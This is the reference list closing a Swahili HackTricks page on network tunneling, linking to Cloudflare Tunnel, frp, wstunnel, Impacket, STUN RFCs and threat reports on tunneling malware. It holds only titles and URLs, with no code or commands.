- [46] [Faili ya usanidi ya Cloudflare Tunnel](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Vigezo vya uendeshaji vya Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [Dhana za frp](https://gofrp.org/en/docs/concepts/)
- [49] [frp XTCP](https://gofrp.org/en/docs/features/xtcp/)
- [50] [frp SSH Tunnel Gateway](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [Nyaraka za QEMU networking](https://www.qemu.org/docs/master/system/devices/net.html)
- [52] [wstunnel README](https://github.com/erebe/wstunnel/blob/main/README.md)
- [53] [Hifadhi ya msimbo chanzo ya NetSPI BOFScale](https://github.com/NetSPI/BOFscale)
- [54] [BOFScale: Tailnet Inayopitishwa Kupitia CDN kutoka kwa BOF-PE](https://www.netspi.com/blog/technical-blog/red-teaming/bofscale-a-cdn-fronted-tailnet-from-a-bof-pe/)
- [55] [Microsoft Learn - Amri za CLI za Dev Tunnels](https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/cli-commands)
- [56] [V-E-O/rdp2tcp](https://github.com/V-E-O/rdp2tcp)
- [57] [Fortra Impacket - atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
- [58] [NightEagle APT: GhostContainer na Tunneling](https://securelist.com/tr/nighteagle-apt-ghostcontainer-and-tunneling/121323/)
- [59] [FortiGuard Labs - ClingSTUN Linux Backdoor Inatumia Miundombinu ya Umma ya STUN Vibaya](https://www.fortinet.com/blog/threat-research/clingstun-linux-backdoor-abuses-public-stun-infrastructure)
- [60] [RFC 8489 - Session Traversal Utilities for NAT (STUN)](https://www.rfc-editor.org/rfc/rfc8489.html)
- [61] [RFC 4787 - Mahitaji ya Tabia ya NAT kwa Unicast UDP](https://www.rfc-editor.org/rfc/rfc4787.html)
- [62] [Tailcat README](https://github.com/tailscale/tailcat/blob/main/README.md)
- [63] [Malwarebytes - Malware ya Kothamine hutumia tailcat ya Tailscale kukwepa ugunduzi wa mtandao](https://www.malwarebytes.com/blog/threat-intel/2026/09/kothamine-malware-uses-tailscales-tailcat-to-evade-network-detection)
{{#include ../banners/hacktricks-training.md}}
